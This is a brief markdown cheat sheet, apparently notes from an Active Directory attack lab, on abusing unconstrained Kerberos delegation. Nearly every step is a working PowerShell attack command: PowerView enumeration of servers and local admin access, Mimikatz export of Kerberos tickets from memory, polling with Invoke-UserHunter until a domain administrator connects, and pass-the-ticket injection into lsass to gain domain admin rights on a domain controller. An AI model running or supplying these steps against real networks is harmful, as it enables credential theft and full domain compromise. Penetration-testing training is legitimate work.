# Abusing Unconstrained Delegation privileges

1. Find server that has unconstrained delegation enabled
```powershell
Get-NetComputer -Unconstrained
```

2. Need local admin to victim

```powershell

# .\Powerview.ps1 
Find-LocalAdminAccess

# .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess

# Run mimikatz on target to see if domain admin ticket already present
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
ls | select name

```

If no ticket, wait / trick DA to access resource on victim
```powershell
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

3. Use ticket by injecting it into lsass to get DA privileges
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt [0;3c4d02]-2-0-60a10000 -Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

4. check if succeed
```powershell
Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc
```




